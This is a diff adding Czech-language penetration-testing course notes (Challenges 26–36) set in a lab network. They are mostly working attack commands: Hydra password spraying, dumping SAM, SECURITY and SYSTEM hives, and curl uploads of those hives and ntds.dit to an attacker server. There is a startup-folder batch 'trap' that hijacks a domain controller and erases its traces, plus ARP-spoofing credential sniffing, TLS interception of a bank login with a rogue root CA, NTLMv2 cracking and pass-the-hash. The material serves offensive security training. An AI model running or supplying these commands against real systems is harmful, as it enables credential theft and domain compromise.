@@ -684,10 +684,268 @@ Challenge 26 (Guessing)
 Řešení: Uhodnutí správného hesla (Guessing)
 
 	NET USE \\192.168.56.10\c$ /user:administrator password
-
 	FOR /F %h IN (pass.txt) DO NET USE \\192.168.56.10\c$ /user:administrator %h
+	FOR /F %h IN (pass.txt) DO @(NET USE \\192.168.56.10\c$ /user:administrator %h 2> NUL && ECHO Spravne heslo je %h)
+
+Challenge 27 (Guessing s využitím Hydry)
+-----------------------
+Úkol:	Zjistěte hesla uživatelů guessingem pomocí nástroje Hydra
+
+Řešení:
+	hydra -l dajdou -p heslo smb://192.168.56.12
+	hydra -l dajdou -p heslo pop3://192.168.56.12
+	hydra -l dajdou -p heslo smtp://192.168.56.12
+	hydra -l dajdou -p heslo rdp://192.168.56.12
+	hydra -l dajdou -p heslo mysql://192.168.56.12
+
+	hydra -l dajdou -p 'Pa$$w0rd' smb://192.168.56.12
+	Veritkální guessing
+		hydra -l dajdou -P pass.txt smb://192.168.56.12
+	Horizontální guessing (Pass spraying)
+		hydra -L users.txt -p 1234 smb://192.168.56.12
+
+	hydra -L users.txt -P pass.txt smb://192.168.56.12
+
+Challenge 28
+------------
+Úkol:	Získejte hesla lokálních uživatelských účtů z napadeného PC
+
+Řešení:	Přístupové údaje k lokálním uživatelským účtům jsou uloženy v registrech v klíči HKLM\SAM
+	Přístup do SAM má pouze několik málo vyjmenovaných procesů, například LSASS
+
+	Protože se do SAM databáze nedostaneme na běžícím ystému, bude nutné odcizit soubos SAM a z něj vyextraovat data specializovaným nástrojem
+	Možností je ukrást soubor SAM během Off-line útoku
+
+	Druhou možností, pokud budeme mít přístup na účet System nebo Admin je vytvořit kopii klíče SAM příkazem
+		REG SAVE HKLM\SAM %temp%\SAM
+
+	Hodnoty v SAM nejsou uloženy jen tak v plaintextu, ale jsou zašifrovány klíčem Bootkey
+	Bootkey je uložen v registrech v klíči SYSTEM, proto pokud budeme chtít ukrást SAM, musíme ukrást i SYSTEM
+		REG SAVE HKLM\SYSTEM %temp%\SYSTEM
+
+	Odešleme vytvořené soubory s registry útočníkovi
+		CURL --form file=@%temp%\SAM http://1.2.3.170/save.php
+		CURL --form file=@%temp%\SYSTEM http://1.2.3.170/save.php
+
+	Následně soubor SAM rozparsujeme a údaje dešifrujeme pomocí Bootkey nástrojem SecretsDump
+		python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM local
+
+	Do Windows XP SP2 se ukládaly v SAM hashe ve formátu LM hash + NTLM hash.
+	Od XP SP2 se ukládá už pouze NTLM hash
+
+	NTLM hash = MD4    viz: echo -n 'Pa$$w0rd' | iconv -t utf16le | openssl md4
+
+	Pa$$w0rd = 92937945b518814341de3f726500d4ff
+
+	Pro crackování hashů je možné použít nástroje John the Ripper, Hashcat
+
+		Hrubou slilou (brute force)
+			hashcat -m 1000 92937945b518814341de3f726500d4ff -a 3 --force
+
+		Slovníkovým útokem (dictionary attack)
+			hashcat -m 1000 92937945b518814341de3f726500d4ff -a 0 /usr/share/wordlists/rockyou.txt --force
+			hashcat -m 1000 hashe.txt -a 0 /usr/share/wordlists/rockyou.txt --force
+
+	Windows hesla v SAM před zahashováním nesolí, Linux solí
 
 
+Challenge 29
+------------
+Úkol:	Získejte hesla doménových uživatelských účtů z napadeného PC
+Řešení:	Ukradneme z napadeného PC Cache credentials, které jsou uloženy v registrech v KLíči SECURITY
+	Údaje v SECURITY nejsou uloženy v plaintextu, ale jsou zašifrovány pomocí Bootkey
+	Je tedy nutné kromě klíče SECURITY ukrást i SYSTEM
+	Defaultně se do cache credentials, ukládá 10 posledních přihlášených uživatelů (možné změnit)
+	Pod účtem s vyšším oprávněním (system, admin) ukradneme klíče registrů
+		REG SAVE HKLM\SECURITY %temp%\SECURITY
+		REG SAVE HKLM\SYSTEM %temp%\SYSTEM
+		CURL --form file=@%temp%\SECURITY http://1.2.3.170/save.php
+		CURL --form file=@%temp%\SYSTEM http://1.2.3.170/save.php
+	Následně soubor SECURITY rozparsujeme a údaje dešifrujeme pomocí Bootkey nástrojem SecretsDump
+		python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -security SECURITY -system SYSTEM local
+		
+	Windows ukládal do verze XP Cache crentials jako MS-CACHE (DCC)
+		MD5(username + NTLM)
+	Windows ukládá po verzi XP Cache crentials jako MS-CACHE v2 (DCC2)
+		10240xMD5(username + NTLM) = MD5(...(MD5(MD5(MD5(MD5(username + NTLM))))))     algoritmus: PBKDF2
+
+	Pro crackování hashů je možné použít nástroje John the Ripper, Hashcat
+
+		hashcat -m 2100 '$DCC2$10240#dajdou#5ebb83d84e2972681324c326855a45bb' -a 0 /usr/share/wordlists/rockyou.txt --force
+
+Challenge 30
+------------
+Úkol:	Získejte hesla všech doménových uživatelských účtů z DC skrz vzdálenou CMD běžného uživatele
+
+Řešení:	Hesla ke všem doménovým účtům jsou uložena na DC v souboru ntds.dit
+	Soubor ntds.dit není možné zkopírovat na běžícím systému
+	Obsah souboru ntds.dit je zašifrován pomocí Bootkey
+	Pokud budeme chtít ukrást obsah ntds.dit, musíme obsah vyexportovat (zazálohovat) + musíme ukrást klíč SYSTEM z registrů
+	Pro zazálohování je nutné admin oprávnění na DC
+	Windows nám k zálohování poskytuje nástroj ntdsutil
+
+		ntdsutil
+			activate instance ntds
+			ifm
+			create full c:\backup
+			quit
+			quit
+
+Postup při krádeži:
+	Musíme si na vzdáleném systému navýšit oprávnění z běžného uživatele na system
+	Vytvoříme past na doménového admina v perzistentní oblasti napadeného PC
+	Po přihlášení doménového admina sklapne past, která vzdáleně vykrade obsah DC (vytvoříme vzdáleně zálohu a odešleme jí útočníkovi)
+
+	pastdc.bat
+		1) Vytvoříme pomocný soubor i.txt s instrukcemi pro ntdsutil
+		2) vytvoříme soubor dcattack.bat, který se bude následně spouštět na DC jako služba
+		   jeho úkolem bude spustit pod systémem nástroj ntdsutil s přesměrovaným vstupem ze souboru i.txt
+		3) uploadneme výše uvedené soubory na DC
+		4) vytvoříme na DC službu, která bude spouštět dcattack.bat
+		5) spustíme službu -> vytvoří se na dc záloha
+		6) stáhneme zálohu
+		7) odešleme ji útočníkovi
+		8) uklidíme po sobě
+
+		ECHO quit >> %temp%\i.txt
+		ECHO quit >> %temp%\i.txt
+
+		ECHO ntdsutil ^< C:\Windows\i.txt > %temp%\dcattack.bat
+
+		COPY %temp%\i.txt %logonserver%\admin$\i.txt /y
+		COPY %temp%\dcattack.bat %logonserver%\admin$\dcattack.bat /y
+
+		SC %logonserver% CREATE dcattack binpath= "cmd /c cmd /c C:\Windows\dcattack.bat"
+		SC %logonserver% START dcattack
+
+		TIMEOUT /t 10
+
+		COPY "%logonserver%\c$\backup\Active Directory\ntds.dit" %temp%\ntds.dit /y
+		COPY "%logonserver%\c$\backup\Registry\SYSTEM" %temp%\SYSTEM /y
+
+		CURL --form file=@%temp%\ntds.dit http://1.2.3.170/save.php
+		CURL --form file=@%temp%\SYSTEM http://1.2.3.170/save.php
+
+		RMDIR /S /Q %logonserver%\c$\backup
+		SC %logonserver% DELETE dcattack
+		DEL %logonserver%\admin$\i.txt
+		DEL %logonserver%\admin$\dcattack.bat
+		DEL %temp%\ntds.dit
+		DEL %temp%\SYSTEM
+		DEL "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\pastdc.bat"
+
+	Odešleme si pastdc.bat na webový server
+		SCP pastdc.bat kali@192.168.56.170:/var/www/html
+
+	Přes vzdálenou CMD se systémovým oprávněním stáhneme naší past do složky Startup
+		CURL http://1.2.3.170/pastdc.bat --output "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\pastdc.bat"
+
+	Následně soubor ntds.dit rozparsujeme a údaje dešifrujeme pomocí Bootkey nástrojem SecretsDump
+		python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system SYSTEM local
+
+	Cracneme vytažené NTLM hashe
+		hashcat -m 1000 92937945b518814341de3f726500d4ff -a 0 /usr/share/wordlists/rockyou.txt --force
+
+Challenge 31
+------------
+Úkol:	Odposlechněte z Kali Linuxu heslo oběti na W10F, které oběť zadává na stránce http://www.linux.cz/czlug/admin
+Řešení:
+	Útok ARP Poisoning & Routing (APR)
+	
+	Nejprve zapneme routování v Linuxu
+		echo 1 > /proc/sys/net/ipv4/ip_forward
+
+	Otrávíme ARP cache oběti a GW
+		arpspoof -i eth1 -t 192.168.56.10 192.168.56.254 -r
+
+	Útočník odposlouchává ve Wiresharku HTTP komunikaci na adaptéru eth1,
+		kde si může vyfiltrovat pouze POST požadavky pomocí display filtru:
+			http.request.method==POST
+	Oběť se přihlásí na zmíněné stránce
+	Útočník vidí přihlašovací údaje ve Wiresharku
+
+Challenge 32
+------------
+Úkol:	Uneste sezení uživatele přihlášeného do administrace routeru
+
+Řešení:	Uživatel je přihlášen do administrace routeru na 192.168.56.254 (root / qwerty)
+	Útočník zahájí ARP poisoning, ale už nebude schopen odposlechnout přihlašovací údaje
+	Útočníkovi ovšem stačí zachytit libovolný http request směřující od přihlášené oběti k aplikaci,
+	protože se v něm nachází autentizační cookie (session id)
+	pokud si prohlédneme obsah reguestu a vyhledáme v něm hlavičku Cookie s tímto SessionID
+	a toto si vložíme v nástrojích pro vývojáře (F12) do svého prohlížeče, budeme schopni přistoupit
+	k aplikaci pod identitou naší oběti.
+
+Challenge 33
+------------
+Úkol:	Odposlechněte heslo uživatele, který se přihlašuje do svého internetového bankovnictví na stránce ib.fio.cz (HTTPS)
+Řešení:
+	Vygenerujeme si certifikát pro naší vlastní certifikační autoritu
+		openssl req -x509 -newkey rsa:2048 -keyout x.key -out x.crt -nodes -subj "/C=CZ/O=Garaz/OU=GarazSecurity/CN=GarazCA"
+	Nastavíme si pomocí IPTABLES v systému pravidlo, které bude veškerou komunikaci přicházející na port 443 přesměrovávat
+	na port 8443 nástroji SSL Split. Ten se bude starat o záměnu certifikátů
+		iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8443
+	Vytvoříme si složku SSL pro zachcenou komunikaci
+		mkdir ssl
+	Spustíme nástroj SSL Split
+		sslsplit -l spojeni.log -S ssl -k x.key -c x.crt tcp 0.0.0.0 800 ssl 0.0.0.0 8443
+Nevýhoda:
+	Uživatel je upozorněn na certifikát, který je vystaven nedůvěryhodnou certifikační autoritou
+	Pokud budeme chtít, aby na uživatele informační upozornění nevyskakovalo, musíme z naší autority u uživatele udělat důvěryhodnou autoritu
+	Stačí, kdy přidáme certifikát naší autority mezi důvěryhodné v uživatelském PC
+		CURL http://1.2.3.170/x.crt --output %temp%\x.crt
+		CERTUTIL -user -f -addstore root %temp%\x.crt
+	Ověřit si autority můžete v konzoli certmgr.msc
+
+Challenge 34
+------------
+Úkol:	Odposlechněte ověření uživatele, který na síti přistupuje ke sdílené složce a získejte jeho heslo
+
+Řešení:
+	Útočník se postaví do pozice MiTM mezi oběť a cílové zařízení
+		arpspoof -i eth1 -t 192.168.56.10 192.168.56.12 -r
+	Spustí si Wireshark a vyfiltruje si protokol ntlmssp
+	Uživatel půjde navštívit sdílenou složku na cílovém zařízení
+	
+
+	Challenge:	eda6b5de6e6fb5ae
+	Response:	fd426444ee9e7eeb37ed41e9622eb48c
+			0101000000000000a4acd5d1da73db01b513519e5c51e8db00000000020010004e0041004b004f004c0045004e0049000100100053004500520056004500520031003200040016004e0041004b004f004c0045004e0049002e0043005a0003002800530065007200760065007200310032002e004e0041004b004f004c0045004e0049002e0043005a00050016004e0041004b004f004c0045004e0049002e0043005a0007000800a4acd5d1da73db010600040002000000080030003000000000000000010000000020000077560c49d69878a9f91d566406af6f86b75208bd8646b67ad6653c0a1f321ac40a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00350036002e00310032000000000000000000
+
+	Vtvoříme řetězec ve formátu:
+		username::domena:challenge:md5:zbytek z response
+
+		dajdou::NAKOLENI:eda6b5de6e6fb5ae:fd426444ee9e7eeb37ed41e9622eb48c:0101000000000000a4acd5d1da73db01b513519e5c51e8db00000000020010004e0041004b004f004c0045004e0049000100100053004500520056004500520031003200040016004e0041004b004f004c0045004e0049002e0043005a0003002800530065007200760065007200310032002e004e0041004b004f004c0045004e0049002e0043005a00050016004e0041004b004f004c0045004e0049002e0043005a0007000800a4acd5d1da73db010600040002000000080030003000000000000000010000000020000077560c49d69878a9f91d566406af6f86b75208bd8646b67ad6653c0a1f321ac40a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00350036002e00310032000000000000000000
+
+	Výsledný řetězec předáme Hashcatu ke cracknutí
+		hashcat -m 5600 'dajdou::NAKOLENI:eda6b5de6e6fb5ae:fd426444ee9e7eeb37ed41e9622eb48c:0101000000000000a4acd5d1da73db01b513519e5c51e8db00000000020010004e0041004b004f004c0045004e0049000100100053004500520056004500520031003200040016004e0041004b004f004c0045004e0049002e0043005a0003002800530065007200760065007200310032002e004e0041004b004f004c0045004e0049002e0043005a00050016004e0041004b004f004c0045004e0049002e0043005a0007000800a4acd5d1da73db010600040002000000080030003000000000000000010000000020000077560c49d69878a9f91d566406af6f86b75208bd8646b67ad6653c0a1f321ac40a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00350036002e00310032000000000000000000' -a 0 /usr/share/wordlists/rockyou.txt --force
+
+Challenge 35
+------------
+Úkol:	Získejte CMD ze server12 pouze se zanlostí NTLM hashe
+
+Řešení:	Útok Pass The Hash
+		pth-winexe --user=NAKOLENI/dajdou%00000000000000000000000000000000:92937945b518814341de3f726500d4ff //192.168.56.12 cmd.exe
+
+Challenge 36
+------------
+Úkol:	Hack the world by child
+
+Řešení:
+	Budeme potřebovat grafický hackovací nástroj Armitage
+	Pro možnost instalace nástrojů z archivu je potřeba přidat klíč k repozitáři archiv
+		wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add
+	Zaktualizujeme seznam dostupných balíčků
+		apt update
+	Nainstalujeme nástroje kali-root-login a Armitage
+		apt install kali-root-login
+		apt install armitage
+	Nastavíme rootovi heslo
+		passwd
+	Přihlásíme se na roota
+	Spustíme Armitage
+		hosts / Nmap scan / Quick scan (OS detect)
+		síť: 192.168.56.0/24
 
 Přesměrování vstupů / výstupů
 -----------------------------
@@ -698,7 +956,7 @@ TYPE pozdrav.txt | FINDSTR zdar Výstup prvního nástroje pošle na vstup druh�
 ECHO ahoj && ECHO cau		Druhý příkaz se vykoná po prvním, ale pouze tehdy, pokud první příkaz skončil bez chyby
 ECHO ahoj || ECHO cau		Druhý příkaz se vykoná po prvním, ale pouze tehdy, pokud první příkaz skončil s chybou
 ECHO ahoj & ECHO cau		Druhý příkaz se vykoná po prvním vždy
-
+ntdsutil < vstup.txt		Přesměrování vstupu ze souboru místo z klávesnice
 
 
 
@@ -716,7 +974,7 @@ Důležitá doporučení pro zvýšení bezpečnosti
 - Na zařízeních nesmí být nikdy ve skupině lokálních administrátorů doménové účty, vždy pouze lokální účet administrátora, který má na všech zařízeních jiné heslo (ideálně LAPS)
 - Pravidelné zálohování (včetně ověřování funkčnosti) s ukládáním záloh na geograficky odděleném místě
 - Pravidelné a včasné aktualizace OS, veškerý SW, všechny add-ony
-
-
-
+- Používat konfigurovatelné switche se zapnutou volbou Dynamic ARP Inspection
+- Pro síťovou komunikaci používat bezpodmínečně pouze šifrované protokoly
+- Nikdy uživatelé nesmí schálit použití nedůvěryhodných certifikátů
 
